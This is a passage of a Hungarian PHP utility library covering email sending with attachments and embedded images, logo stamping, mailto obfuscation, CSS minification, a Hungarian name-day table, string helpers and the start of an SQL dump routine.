        $mail -> addReplyTo($felado_mail, $felado_nev);
        $mail -> Subject  = $targy;
        $mail -> AltBody  = strip_tags($uzi);
        $mail -> MsgHTML($uzi);

        if(is_array($fajlok)){
            foreach($fajlok as $fajl){
                if($fajl['nev'] && $fajl['fajl']){
                    $mail -> AddAttachment($fajl['fajl'], $fajl['nev']);
                } else {
                    $mail -> AddAttachment($fajl);
                }
            }

        }elseif($fajlok){
            $mail -> AddAttachment($fajlok);
        }

        if( is_array($cimzett_mail) ) {
            $i = 0;
            foreach ( $cimzett_mail as $mail ) {

                // A második címzett már rejtve kapja meg
                if( $i ) {
                    $mail -> AddBcc($mail, $cimzett_nev[$i]);
                } else {
                    $mail -> addAddress($mail, $cimzett_nev[$i]);
                }

                $i++;

            }
        } elseif( $cimzett_mail ) {
            $mail -> AddAddress($cimzett_mail, $cimzett_nev);
        }

        if( !$mail->Send() ) {
            $mail -> ClearAddresses();
            $mail -> ClearAttachments();
            return 'Hiba: ' . $mail->ErrorInfo;
        } else {
            $mail -> ClearAddresses();
            $mail -> ClearAttachments();
            return false;
        }
    } else {
        return 'Hiba: Nincs címzett!';
    }
}

/**
 * @desc Általános levélküldő függvény összetettebb verziója, ahol lehet másolatot, rejtett másolatos címeket is megadni. Az adatokat UTF-8-ban (vagyis az oldal karakterkészletében) várja. Kimenetele nincs, csak ha hiba van
 * 
 * @param $felado_nev string feladó neve
 * @param $felado_mail string feladó e-mail címe
 * @param $cimzett_nev string/array címzett neve
 * @param $cimzett_mail string/array címzett e-mail címe
 * @param $masolat_nev string/array másolatot kap neve
 * @param $masolat_mail string/array másolatot kap e-mail címe
 * @param $r_masolat_nev string/array rejtett másolatot kap neve
 * @param r_masolat_mail string/array rejtett másolatot kap e-mail címe
 * @param $targy string feladó tárgy
 * @param $uzi string feladó üzenet
 * @param $fajlok string/array csatolandó fájlok elérési útvonala a szerveren (Ez lehet egy sima felsorolása az útvonalakról, de többdimenziós tömbkét megadhatóak a fájlok megnevezései is. Pl. array( array('nev' => 'Ékezetes fájlnév', 'fajl' => 'fajl/utvonala.kit'), ...  );  .)
 * 
 * @return string Ha volt hiba, akkor a hibaüzenetet, egyébként FALSE!
 */
function level_kuldes_osszetettebb( $felado_nev, $felado_mail, $cimzett_nev, $cimzett_mail, $masolat_nev, $masolat_mail, $r_masolat_nev, $r_masolat_mail, $targy, $uzi, $fajlok, $levelpapiros ) {

    if( $cimzett_mail ) {

        // Ha a feladó neve ontEAM, akkor a levél feladója esetén ezt toldjuk még meg egy "Danubius Zrt."-vel
        if( $felado_nev == get_nev() ) {
            $felado_nev .= ' Danubius Zrt.';
        }
        
        require_once('class/class.Phpmailer.php');
        $mail = new PHPMailer;
        
        // Ha azt szeretnénk, hogy levélpapíros legyen a levél, akkor még a levélpapírt betöltjük
        if( $levelpapiros ) {
            $levelpapir = fajlbol_olvas('../sablon/levelpapir.html');
            $uzi = str_replace('{TARTALOM}', $uzi, $levelpapir);
        }

        $uzi = mail_img2cid($uzi, $mail, $cimzett_mail);
        $mail -> CharSet  = get_web_charset();
        $mail -> setFrom($felado_mail, $felado_nev);
        $mail -> addReplyTo($felado_mail, $felado_nev);
        $mail -> Subject  = $targy;
        $mail -> AltBody  = strip_tags($uzi);
        $mail -> MsgHTML($uzi);
        
        if( is_array($fajlok) ) {
            foreach ( $fajlok as $fajl ) {
                $mail -> AddAttachment($fajl);
            }

        } elseif( $fajlok ) {
            $mail -> AddAttachment($fajlok);
        }

        // Címzett
        if( is_array($cimzett_mail) ) {
            $i = 0;
            foreach ( $cimzett_mail as $c_mail ) {
                $mail -> addAddress(trim($c_mail), trim($cimzett_nev[$i]));
                $i++;
            }
        } elseif( $cimzett_mail ) {
            $mail -> AddAddress(trim($cimzett_mail), trim($cimzett_nev));
        }

        // Másolatot kap
        if( is_array($masolat_mail) ) {
            $i = 0;
            foreach ( $masolat_mail as $c_mail ) {
                $mail -> addCC(trim($c_mail), trim($masolat_nev[$i]));
                $i++;
            }
        } elseif( $masolat_mail ) {
            $mail -> addCC(trim($masolat_mail), trim($masolat_nev));
        }

        // Másolatot kap
        if( is_array($r_masolat_mail) ) {
            $i = 0;
            foreach ( $r_masolat_mail as $c_mail ) {
                $mail -> AddBcc(trim($c_mail), trim($r_masolat_nev[$i]));
                $i++;
            }
        } elseif( $r_masolat_mail ) {
            $mail -> AddBcc(trim($r_masolat_mail), trim($r_masolat_nev));
        }

        if( !$mail->Send() ) {
            $mail -> ClearAddresses();
            $mail -> ClearAttachments();
            return 'Hiba: ' . $mail->ErrorInfo;
        } else {
            $mail -> ClearAddresses();
            $mail -> ClearAttachments();
            return false;
        }
    }
}

/**
* @desc Logót vagy bármilyen más képet pecsétel egy alap képre
* A logó lehet átlátszó, melyet át is méretez
* 
* @param $kep       string Az alap kép elérési útvonala
* @param $logo      string A logó elérési útvonala
* @param $eltolas_x int    Az eltolás mértéke százalékosan X irányba az alap képen
* @param $eltolas_x int    Az eltolás mértéke százalékosan X irányba az alap képen
* @param $eltolas_y int    Az eltolás mértéke százalékosan Y irányba az alap képen
* @param $kicsinyit int    A logó/pecsét kicsinyítése az eredeti képhez képest százalékosan szélesség alapján
*
* @return image adat
*/
function logot_pecsetel( $kep, $logo, $eltolas_x = 0, $eltolas_y = 0, $kicsinyit = 20 ){
	
	$data           = fread(fopen($kep, 'rb'), filesize($kep));
	$alap_kep       = imagecreatefromstring($data);
	$alap_kep_meret = getimagesize($kep);
	
	$pecset_kep_sz = ceil( $alap_kep_meret[0] * $kicsinyit /100 );
	$pecset_kep_m  = ceil( $alap_kep_meret[1] * $kicsinyit /100 );

	$pecset_uj_meret = getimagesize($logo);
	$arany           = $pecset_uj_meret[1] / $pecset_uj_meret[0];

    //A pecsét maximum a saját mérete lehet, túl nagy kép esetén ne nyúljtsuk tovább!
    if($pecset_uj_meret[0] > $pecset_kep_sz){
        $pecset_uj_meret[0] = $pecset_kep_sz;
    }
	$pecset_uj_meret[1] = floor(abs($pecset_uj_meret[0] * $arany));

    //Ha a pecsét kilógna a képből függőleges irányban
    if($pecset_uj_meret[1] > $alap_kep_meret[1]){
        $pecset_uj_meret[1] = $alap_kep_meret[1];
    }
    $pecset_uj_meret[0] = floor(abs($pecset_uj_meret[1] / $arany));

	$data           = fread(fopen($logo, 'rb'), filesize($logo));
	$pecset_kep     = imagecreatefromstring($data);
	$pecset_kep     = atlatszo_kep_atmeretez($pecset_kep, $pecset_uj_meret[0], $pecset_uj_meret[1]);
	
	$kozep_x = ceil( ($alap_kep_meret[0] * $eltolas_x / 100 ) - ($pecset_uj_meret[0] / 2) );
	$kozep_y = ceil( ($alap_kep_meret[1] * $eltolas_y / 100 ) - ($pecset_uj_meret[1] / 2) );
 
	//Kilógások a képből X+
	if( $kozep_x + $pecset_uj_meret[0] > $alap_kep_meret[0] ){
		$kozep_x = $alap_kep_meret[0] - $pecset_uj_meret[0];
	}
	//Kilógások a képből Y+
	if( $kozep_y + $pecset_uj_meret[1] > $alap_kep_meret[1] ){
		$kozep_y = $alap_kep_meret[1] - $pecset_uj_meret[1];
	}
	//Kilógások a képből X-
	if( $kozep_x < 0 ){
		$kozep_x = 0;
	}
	//Kilógások a képből Y-
	if( $kozep_y < 0 ){
		$kozep_y = 0;
	}
	
	imagecopy($alap_kep, $pecset_kep, $kozep_x, $kozep_y, 0, 0, $pecset_uj_meret[0], $pecset_uj_meret[1]);
	
	return $alap_kep;
}

/**
*	class.Mail kiegésztése, ezzel lehet megoldani azt, hogy a levél képei a HTML-be ágyazva jelenjenek meg.
*   Egy stringben (HTML szövegben), a képeket lecseréli cid-ekre, illetve embeddelve AddEmbeddedImage-vel hozzá is adja csatolmánynak
*   Használatára találsz mintát a Modulok között.
*
*   @param  string $html: a HTML, benne <img src="..." />-kel
*   @param  object $mail: a mail osztály egy példánya
*   @param  string $cimzett_mail: a címeztt mailcím (azt vizsgáljuk, hogy gmail-es e. Ha igen, akkor másképp kell küldeni
*
*   @return string: új $html, amiben a képek már cid-el szerepelnek
*/
function mail_img2cid($html, $mail, $cimzett_mail){
    preg_match_all('/<img[^>]+src="([^"]+)"[^>]*>/ms', $html, $kepek, PREG_SET_ORDER);
    if(count($kepek)){
        
        foreach($kepek as $kep) {
            $urls[] = $kep[1];
        }
    
        $csatolt_kepek = array();
        for($i = 0, $count = count($urls); $i < $count; $i++) {
            $html = preg_replace('/(<img\s+[^>]*src=")'.preg_quote($urls[$i], '/').'/', '$1cid:kep'.sprintf('%03s',$i+1), $html);
            array_push( $csatolt_kepek, $urls[$i].';kep'.sprintf('%03s',$i+1).';'.substr($urls[$i], strrpos($urls[$i], '/')+1, strlen($urls[$i])) );
        }
        
        // A címeztt mail azért kell, hogy lássuk, Gmail címes-e vagy sem. Ha egy tömböt kapunk, akkor az első mailcím lesz a mérvadó.
        if( is_array($cimzett_mail) ){
            $cimzett_mail = $cimzett_mail[0];
        }
        
        // Csatolt képek lerendezése
        $csatolva_volt = array();
        foreach( $csatolt_kepek as $csatolt_kep ){
    		list( $x1, $x2, $x3 ) = explode(';', $csatolt_kep);
            // Gmail-re a hagyományos módszerre külünk ki levelet (nem CID-el), mert nem megy át
            if(strpos($cimzett_mail, '@gmail.com') || strpos($cimzett_mail, '@hotmail.com')){
                // Ha ../-el kezdődik az útvonal, akkor valószínűleg ezt elvesszük(../elemek/x.jpg => www.domain.hu/elemek/x.jpg)
                if(substr($x1, 0, 3)=='../'){
                    $x1 = substr($x1, 2);
                }
                $html = str_replace('cid:'.$x2, get_http().get_domain().$x1, $html);
            } else {
        		if(!in_array($x1, $csatolva_volt)){
                    $mail -> AddEmbeddedImage($x1, $x2, $x3, 'base64', 'image/jpeg');
                    array_push($csatolva_volt, $x1);
    	        }
            }
	    }
        
        // HTML-ben a kép SRC részénél aposztrófot kell használni, idézőjellel nem működik
        $i = 0;
        if($csatolt_kepek){
            foreach( $csatolt_kepek as $csatolt_kep ){
                $html = str_replace('src="cid:kep'.sprintf('%03s',$i+1).'"', "src='cid:kep".sprintf('%03s',$i+1)."'", $html);
                $i++;
            }
        }
    }
    
    return $html;
}


/**
*	Mail rejtés
*	Egy mailto link HTML kódját zavarja össze (cím megfordítása, kukac & pont csere ), 
*	ezt kerül bele egy forrásba. A zavaros kódot egy javascript állítja vissza.
*	pl.: mail_rejtes("<a style='font-size: 1.1rem' onmouseover='alert(\'Javascript üzenet\')' href='mailto:bk@webdeb.hu'>küldj üzenentet</a>");
*
*	@param  szting $tartalom: a mailto lint HTML kódja
*	@return string: HTML forráskód, mely egy javascript-et hív meg a main.js-ből.
*/
function mail_rejtes($tartalom){
    
	$pattern = "/ href=['\"]([^'\"]*)['\"]/";
	preg_match_all($pattern,$tartalom, $megoldasok);
	
	$mailcim        = str_replace('mailto:', '', $megoldasok[1][0]);
	$kodolt_mailcim = str_replace(array('@', '.'), array('!kukac!', '!pont!'), strrev($mailcim));
	$tartalom       = str_replace(array($mailcim, "'", '\"'), array($kodolt_mailcim, '"', "\'"), $tartalom);
	
	$mit   = array('<a', '</a>');
	$mivel = array('', '');
    
    return '<span class="f_mail_rejtes dn">'.str_replace($mit, $mivel, $tartalom).'</span>';
    
}


/** Minify CSS
 * 
 * @desc CSS egysorosítása illetve konvertálása CSS3-ra
 * @param string:  a css elérési útvonala
 * @param boolean: ha igaz, akkor a rem-es sorok elé bemásolja ugyanazt a sort, de PX értékekkel. Ezzel régebbi böngészőkre tudjuk a CSS-t optimalizálni.
 * 
 * @return string: egyorossított és átkonvertált CSS
 * 
 */
function minify_css($css, $px_verzio_is = false){
    if(is_file($css)){
        $css   = fajlbol_olvas($css, 1);
        $css   =  preg_replace('#/\*.*?\*/#s', '', $css);
        $mit   = array('{',  '}',  ';');
        $mivel = array('{|', '}|', ';|');
        $css   = str_replace($mit, $mivel, $css);

        $elozo_sor = '';
        foreach (explode('|', $css) as $sor){

            //A webkit szerű css-eket kiszedjük, hisz ezt úgyis automatikusan begeneráljuk
            if( (strpos($sor, '-o-')===false && strpos($sor, '-moz-')===false && strpos($sor, '-webkit-')===false && strpos($sor, '-ms-')===false) || strpos($sor, '::-moz-')){

                //Rem 2 px a korábbi IE miatt
                if($px_verzio_is){
                    if(strpos($sor, 'rem') && strpos($sor, ':') && strpos($sor, '{')===false){

                        list($ea, $eb) = explode(':', $elozo_sor);
                        list($a, $b)   = explode(':', $sor);
                        $elozo_sor = $sor;
                        //Többször lefuttatva is jó legyen
                        if($ea!=$a){
                            $mit   = array();
                            $mivel = array();
                            foreach(explode('rem', $b) as $ertek){
                                $ertek = trim($ertek);
                                if( is_numeric($ertek) ){
                                    array_push($mit,   $ertek   );
                                    array_push($mivel, $ertek*10);
                                }
                            }

                            array_push($mit,  'rem');
                            array_push($mivel, 'px');
                            $mit   = array_unique($mit);
                            $mivel = array_unique($mivel);
                            $b = str_replace($mit, $mivel, $b);
                            $sor = $a.': '.$b.$sor;
                        }

                    }
                }

                //Webkit, moz és a többi generálása
                if(strpos($sor, 'appearance')){
                    $sor =  str_replace('appearance', '-webkit-appearance', $sor).
                            str_replace('appearance', '-moz-appearance', $sor).
                            str_replace('appearance', '-ms-appearance', $sor).
                            str_replace('appearance', '-o-appearance', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'box-reflect')){
                    $sor =  str_replace('box-reflect', '-webkit-box-reflect', $sor).
                            str_replace('box-reflect', '-moz-box-reflect', $sor).
                            str_replace('box-reflect', '-ms-box-reflect', $sor).
                            str_replace('box-reflect', '-o-box-reflect', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'animation')){
                    $sor =  str_replace('animation', '-webkit-animation', $sor).
                            str_replace('animation', '-moz-animation', $sor).
                            str_replace('animation', '-ms-animation', $sor).
                            str_replace('animation', '-o-animation', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'backface-visibility')){
                    $sor =  str_replace('backface-visibility', '-webkit-backface-visibility', $sor).
                            str_replace('backface-visibility', '-moz-backface-visibility', $sor).
                            str_replace('backface-visibility', '-ms-backface-visibility', $sor).
                            str_replace('backface-visibility', '-o-backface-visibility', $sor).
                            $sor
                            ;
                }

                if(strpos($sor, 'column-count')){
                    $sor =  str_replace('column-count', '-webkit-column-count', $sor).
                            str_replace('column-count', '-moz-column-count', $sor).
                            $sor
                            ;
                }

                if(strpos($sor, 'column-gap')){
                    $sor =  str_replace('column-gap', '-webkit-column-gap', $sor).
                            str_replace('column-gap', '-moz-column-gap', $sor).
                            $sor
                            ;
                }

                if(strpos($sor, 'column-rule')){
                    $sor =  str_replace('column-rule', '-webkit-column-rule', $sor).
                            str_replace('column-rule', '-moz-column-rule', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'font-feature-settings')){
                    $sor =  str_replace('font-feature-settings', '-webkit-font-feature-settings', $sor).
                            str_replace('font-feature-settings', '-moz-font-feature-settings', $sor).
                            str_replace('font-feature-settings', '-ms-font-feature-settings', $sor).
                            str_replace('font-feature-settings', '-o-font-feature-settings', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'filter')){
                    $sor =  str_replace('filter', '-webkit-filter', $sor).
                            str_replace('filter', '-moz-filter', $sor).
                            str_replace('filter', '-ms-filter', $sor).
                            str_replace('filter', '-o-filter', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'user-modify')){
                    $sor =  str_replace('user-modify', '-webkit-user-modify', $sor).
                            str_replace('user-modify', '-moz-user-modify', $sor).
                            str_replace('user-modify', '-ms-user-modify', $sor).
                            str_replace('user-modify', '-o-user-modify', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'perspective')){
                    $sor =  str_replace('perspective', '-webkit-perspective', $sor).
                            str_replace('perspective', '-moz-perspective', $sor).
                            str_replace('perspective', '-ms-perspective', $sor).
                            str_replace('perspective', '-o-perspective', $sor).
                            $sor
                            ;
                }

                if(strpos($sor, 'radial-gradient')){
                    $sor =  str_replace('radial-gradient', '-webkit-radial-gradient', $sor).
                            str_replace('radial-gradient', '-moz-radial-gradient', $sor).
                            str_replace('radial-gradient', '-ms-radial-gradient', $sor).
                            str_replace('radial-gradient', '-o-radial-gradient', $sor).
                            $sor
                            ;
                }

                if(strpos($sor, 'transform')){
                    $sor =  str_replace('transform', '-webkit-transform', $sor).
                            str_replace('transform', '-moz-transform', $sor).
                            str_replace('transform', '-ms-transform', $sor).
                            str_replace('transform', '-o-transform', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'transform-style')){
                    $sor =  str_replace('transform-style', '-webkit-transform-style', $sor).
                            str_replace('transform-style', '-moz-transform-style', $sor).
                            str_replace('transform-style', '-ms-transform-style', $sor).
                            str_replace('transform-style', '-o-transform-style', $sor).
                            $sor
                            ;
                }
                
                if(strpos($sor, 'user-select')){
                    $sor =  str_replace('user-select', '-webkit-user-select', $sor).
                            str_replace('user-select', '-moz-user-select', $sor).
                            str_replace('user-select', '-ms-user-select', $sor).
                            str_replace('user-select', '-o-user-select', $sor).
                            $sor
                            ;
                }

                $uj_css .= $sor;
            }
        }
        $uj_css = nl2($uj_css);
        $uj_css = str_replace(array(': ', ';}', ' {', '{ ', ' }', '} ', ', ', '; '), array(':', '}', '{', '{', '}', '}', ',', ';'), $uj_css);
        
        if( css_img() ){
            return css_img_data($uj_css);
        } else {
            return $uj_css;
        }
    }
}

/**
*	Névnap
*	@param int $ho: hónap
*	@param int $nap: nap
*	@return string: az aktuális név
*/
function nevnap($ho = '', $nap = ''){
	if(!$ho) { $ho  = date('n'); }
    if(!$nap){ $nap = date('j'); }
    switch($ho){
		case 1 : $nevek=array('ÚJÉV','Ábel','Benjámin','Titusz','Simon','Boldizsár','Attila, Ramóna','Gyöngyvér','Marcell','Melánia','Ágota','Ernő','Veronika','Bódog','Lóránt','Gusztáv','Antal','Piroska','Sára, Márió','Fábián','Ágnes','Vince','Rajmund','Timót','Pál','Vanda','Angelika','Károly,','Adél','Martina','Marcella',''); break;
		case 2 : $nevek=array('Ignác','Karolina','Balázs','Ráhel','Ágota','Dorottya','Tódor','Aranka','Abigél','Elvira','Marietta','Lívia','Ella','Valentin','Kolos','Julianna','Donát','Bernadett','Zsuzsanna','Aladár','Eleonóra','Gerzson','Alfréd','Mátyás','Géza','Edina','Ákos, Bátor','Elemér','',''); break;
		case 3 : $nevek=array('Albin','Lujza','Kornélia','Kázmér','Adorján','Leonóra','Tamás','Zoltán','Franciska','Ildikó','Szilárd','Gergely','Krisztián','Matild','Kristóf', 'Henrietta','Gertrúd','Sándor','József','Klaudia', 'Benedek','Beáta','Emőke','Gábor','Irén', 'Emánuel','Hajnalka','Gedeon','Auguszta','Zalán','Árpád',''); break;
		case 4 : $nevek=array('Hugó','Áron','Richárd','Izidor','Vince','Vilmos','Herman','Dénes','Erhard','Zsolt','Leó','Gyula','Ida','Tibor','Anasztázia','Csongor','Rudolf','Andrea','Emma', 'Tivadar','Konrád','Csilla','Béla','György','Márk','Ervin', 'Zita','Valéria','Péter','Katalin, Kitti',''); break;
		case 5 : $nevek=array('Fülöp','Zsigmond','Tímea','Mónika','Györgyi','Ivett','Gizella','Mihály','Gergely','Ármin','Ferenc','Pongrác','Szervác','Bonifác','Zsófia', 'Mózes','Paszkál','Erik','Ivó, Milán', 'Bernát','Konstantin','Júlia, Rita','Dezső','Eszter', 'Orbán','Fülöp','Hella','Emil','Magdolna', 'Zsanett','Angéla',''); break;
		case 6 : $nevek=array('Tünde','Anita','Klotild','Bulcsú','Fatime','Norbert','Róbert','Medárd','Félix','Margit','Barnabás','Villő','Antal','Vazul','Jolán','Jusztin','Laura', 'Levente','Gyárfás','Rafael','Alajos','Paulina', 'Zoltán','Iván','Vilmos','János','László','Levente', 'Péter, Pál','Pál',''); break;
		case 7 : $nevek=array('Tihamér','Ottó','Kornél','Ulrik','Sarolta','Csaba','Appolónia','Ellák','Lukrécia','Amália', 'Nóra','Izabella','Jenő','Őrs','Henrik','Valter', 'Endre','Frigyes','Emília','Illés','Dániel', 'Magdolna','Lenke','Kinga, Kincső','Kristóf, Jakab','Anna, Anikó', 'Olga','Szabolcs','Márta','Judit','Oszkár',''); break;
		case 8 : $nevek=array('Boglárka','Lehel','Hermina','Domonkos','Krisztina','Berta','Ibolya','László','Emőd','Lörinc', 'Zsuzsanna','Klára','Ipoly','Marcell','Mária','Ábrahám', 'Jácint','Ilona','Huba','István','Sámuel', 'Menyhért','Bence','Bertalan','Lajos','Izsó', 'Gáspár','Ágoston','Beatrix','Rózsa','Erika'); break;
		case 9 : $nevek=array('Egon','Rebeka','Hilda','Rozália','Viktor','Zakariás','Regina','Mária','Ádám','Nikolett', 'Teodóra','Mária','Kornél','Szeréna','Enikő','Edit', 'Zsófia','Diána','Vilhelmina','Friderika','Máté,','Móric', 'Tekla','Gellért','Eufrozina','Jusztina','Adalbert', 'Vencel','Mihály','Jeromos',''); break;
		case 10: $nevek=array('Malvin','Petra','Helga','Ferenc','Aurél','Renáta','Amália','Koppány','Dénes','Gedeon','Brigitta','Miksa','Kálmán','Helén', 'Teréz','Gál','Hedvig','Lukács','Nándor','Vendel','Orsolya','Előd', 'Gyöngyi','Salamon','Bianka','Dömötör', 'Szabina','Simon','Nárcisz','Alfonz','Farkas',''); break;
		case 11: $nevek=array('Marianna','Achilles','Győző','Károly','Imre','Lénárd','Rezső','Zsombor','Tivadar','Réka','Márton','Jónás, Renátó','Szilvia', 'Aliz','Albert, Lipót','Ödön','Hortenzia, Gergő','Jenő','Erzsébet', 'Jolán','Olivér','Cecília','Kelemen, Klementina','Emma','Katalin', 'Virág','Virgil','Stefánia','Taksony','András, Andor',''); break;
		case 12: $nevek=array('Elza','Melinda','Ferenc','Barbara','Vilma','Miklós','Ambrus','Mária','Natália','Judit','Árpád','Gabriella', 'Luca','Szilárda','Valér','Etelka','Lázár', 'Auguszta','Viola','Teofil','Tamás','Zéno','Viktória','Ádám, Éva', 'KARÁCSONY','KARÁCSONY','János','Kamilla', 'Tamás','Dávid','Szilveszter',''); break;
	}
	return $nevek[$nap-1];  
} 

/**
*	@descr Kiszűri a <tag>-eket, még azokat is amik el lettek kódolva (pl.: %3E). Elsősorban a javascriptes támadások ellen véd.
*
*	@param string $string: amit feldolgoz
*
*	@return array: a biztonságos string
*/
function notags($string){
	return preg_replace("/((\%3C)|<)[^\n]+((\%3E)|>)/i","",$string);
}

/**
*	NL2 Az újsorokat és a duplaszóközöket kiveszi (minek legyen a forrásban)
*
*	@param string $string: amit feldolgoz
*
*	@return string: az újsorok és felesleges szóközöket kiveszi
*/
function nl2($string){	
	return preg_replace('/\s+/', ' ', $string);
}

/**
*	NL2BR 2
*
*	@param string $string: amit feldolgoz
*
*	@return string: az újsorokat <br>-re cseréli
*/
function nl2br2($string){	
	$string = str_replace(array("\r", "\n"),array('', '<br>'), $string);
	return preg_replace('/\s+/', ' ', $string);
}

/**
*	Ha kell, UTF-8 kódolásúra állítja a szöveget
*
*	@param string $string: a szöveg, melynek kódolását ellenőrizzük
*
*	@return string: az esetleg átkódolt string
*/
function utf8($string){ 
    $encoding = get_encoding($string);
    if( $encoding != 'UTF-8' ){
        return iconv($encoding, 'UTF-8', $string);
    }
    return $string;
}

/**
*	UTF-8 szavak részstrigjét adja vissza
*
*	@param string $str: amit feldolgoz
*	@param int $start: honna kezdje el feldolgozni
*	@param int $length: hány karaktert
*
*	@return string: A substring kimenet
*/
function utf8_substr($str, $start, $length=null){
  if(!defined('UTF8_NOMBSTRING') && function_exists('mb_substr'))
    return mb_substr($str,$start,$length,'utf-8');

  $uni = utf8_to_unicode($str);
  return unicode_to_utf8(array_slice($uni,$start,$length));
}

/**
*   Pretty URL-ben kapott változót visszaalkítja pl. ID-vá
*
*	@param string $adat: változó értéke
*
*	@return string: Az átlakított változó értéke (pl. valami/valami2 => valami_p_valami2)
*/
function pretty_url_decode($adat){
    $mit   = array('_p_', ' ');
    $mivel = array('/',   '+');
    return str_replace($mit, $mivel, $adat);
}

/**
*   Adott változó átalakítása pretty URL-é (mentesíteni per jelektől, szóköztől)
*
*	@param string $adat: változó értéke
*
*	@return string: Az átlakított változó értéke (pl. valami/valami2 => valami_p_valami2)
*/
function pretty_url_encode($adat){
    $mit   = array('/');
    $mivel = array('_p_');
    return str_replace($mit, $mivel, $adat);
}

/**
*	Fájl törlő
*	Első sorban akkor hasznos, ha képet és annak thumbjait szeretnénk törölni
*
*	@param string   $dir            : egy útvonalat ad meg, *-ra végződhet. Az összes ilyen kezdetű útvonalú fájlt törölni fogja
*	@param bool     $csak_thumbnail : Ha ezt arra hasznájuk, hogy egy nagy kép thumbnailjait töröljük, akkor el legyen true. Ebben az esetben figyeljük, hogy van-e a 'x' a folytatásban
* 
*	Pl. képek esetén: list($utvonal) = explode(".jpg", PATH."apro/".$sor_apro[kep]); remove_pic($utvonal."*");
*	NAGYON FONTOS, HOGY EBBEN AZ ESETBEN A $sor_apro[kep]) NE LEGYEN ÜRES. EZT LE KELL KEZELNI, NEHOGY MINDENT KITÖRÖLJÖN
*/
function remover($dir, $csak_thumbnail = false){
	
    foreach(glob($dir) as $fajl){
        //Ha csak a thumbnailokat alarjuk törölni, akkor erre figyeljünk is oda
        $torolheto = true;
        if($csak_thumbnail){
            if(!thumbnail_kep_e($fajl)){
                $torolheto = false;
            }
        }
        if($torolheto){
            unlink($fajl);
        }
    }
    
}

/**
* Rész string, szóköznél vágja el a kapott sztringet (hogy ne egy szó kellős közepét vágjuk el).
* Ha a stringet valóban vágni kellett, akkor egy ...-ot tesz a végére, hacsak ez nincs kikapcsolva a 3. paraméterben.
* (A függvény nem egysorosítja a stringet, de a HTML-t kiszűri belőle.)
*
* @param string: a szöveg aminek egy részére van csak szükségünk
* @param integer: hány karakterre van szükségünk
* @param boolean: kell-e a '...' a végére vagy sem (alapból true)
* 
* @return A szöveget szóköznél vágva, ...-tal kiegészítve (ha nincs letiltva), HA hosszabb mint a megadott méret 
*/
function resz_string($szoveg, $meret, $ppp = true ){
$szoveg = strip_tags($szoveg);
    if(strlen($szoveg)>$meret){
        $tmp  = substr($szoveg,0,$meret);
        $hely = strrpos($tmp,' ');
        $tmp  = substr($tmp,0,$hely);
        
        if( $ppp ) {
            $tmp .= ' ...';
        }
        
    } else {
        $tmp = $szoveg;
    }
    
    return $tmp;
}

/**
*	5 HUF-ra kerekítés
*
*	@param number $osszeg: egy számérték
*
*	@return integer: az 5-re kereített érték
*/
function round_5($osszeg){
	return round($osszeg/5, 0) * 5;
}

/**
*	Sablon gyár
*	
*   @param  string $sablon_fajl: a sablon mappában taláható HTML sablon
*   @param  array  $mit: sablonban taláható minták 2013.04.10 ÚJABBAN már elég egy tömb, melyben a kulcsok a sablonok nevei
*   @param  array  $mivel: minták értékei 
*   @param  bool   $data_uri: Ha igaz, akkor a HTML-ben található képeket data_uri forámátumba konvertálja
*   @param  array  $szotar: Szótár azonosítókat vár, és az ilyen nevű sablonváltozókat lecseréli az adott nyelvű szóra
*    
*	@return string: az előállítottt érték
*/
function sablon_gyar($sablon_fajl, $sajat_mit = '', $sajat_mivel = '', $data_uri = false, $szotar = array()){

    //Ha csak a $sajat_mit lett megadva, akkor automatikusan sablonozunk a kulcsok alapján
    if(!$sajat_mivel && $sajat_mit){
        
        //Ráadásuk fel kell cseréni a két tömböt
        $sajat_mivel = $sajat_mit;
        if(is_array($sajat_mivel)){
            foreach($sajat_mivel as $kulcs => $ertek){
                $sajat_mit[$kulcs]   = '{'.strtoupper($kulcs).'}';
            }
        }

    //Egyébként mind a két tömböt figyeljük, ha kell globálisan figyelve a $mit-$mivel változókat => ettől leszünk visszafelé kompatibilisek
    } else {
        global $mit;
        global $mivel;
        if(!$sajat_mit)  { $sajat_mit   = $mit;   }
        if(!$sajat_mivel){ $sajat_mivel = $mivel; }
    }
    
    //Szótárazonosítók figyelése
    if($szotar){
        if(!$sajat_mit){
            $sajat_mit = array();
        }
        if(!$sajat_mivel){
            $sajat_mivel = array();
        }
        foreach($szotar as $ertek){
            array_push($sajat_mit,      '{'.strtoupper($ertek).'}'  );
            array_push($sajat_mivel,    get_tart($ertek)            );
        }
    }

    return str_replace($sajat_mit, $sajat_mivel, fajlbol_olvas('sablon/'.$sablon_fajl, true, $data_uri));
}

/**
*	Self ($_SERVER["PHP_SELF"] rövidebben)
*	
*	@return string: $_SERVER["PHP_SELF"]
*/
function self(){
	return $_SERVER['PHP_SELF'];
}

/**
*	Self ($_SERVER["PHP_SELF"] rövidebben)
*
*	@param boolean  Ha igaz, akkor figyelembe veszi a nyelvet is (pl.: elerhetoseg.php => elerhetoseg_hu.html)
*	@return string: $_SERVER['PHP_SELF']-ből nyert html sablonfájl név 
*/
function self_sablon_nev($nyev_figyeles){
    if($nyev_figyeles){
        return str_replace('.php', '', basename($_SERVER['PHP_SELF'])).'_'.$_SESSION['nyelv'].'.html';
    } else {
        return str_replace('php', '', basename($_SERVER['PHP_SELF'])).'html';
    }
}

/**
*	SQL Dump - adatbázis kimentése SQL-be
*
*	@param bool:  Az eredményt folyamatosan írja ki, ne return legyen
*	@return string: SQL az adatbázisról
*/
function sql_dump($kiir){

    $tables = mysql_list_tables(get_db());
    
    while ($td = mysql_fetch_array($tables)){
        $table = $td[0];
        $r = mysql_query('SHOW CREATE TABLE `'.$table.'`');
        if($r){
            
            $insert_sql = '';
            
            $d     = mysql_fetch_array($r);
            $d[1] .= ';';
            if($kiir){
                echo 'DROP TABLE IF EXISTS `'.$table.'`;'."\r\n";
                echo $d[1]."\r\n";
            } else {
                $SQL[] = 'DROP TABLE IF EXISTS `'.$table.'`;'."\r\n".$d[1];
            }
            
            
            $table_query = mysql_query('SELECT * FROM `'.$table.'`');
            $num_fields  = mysql_num_fields($table_query);
            while ($fetch_row = mysql_fetch_array($table_query)){
                if($kiir){
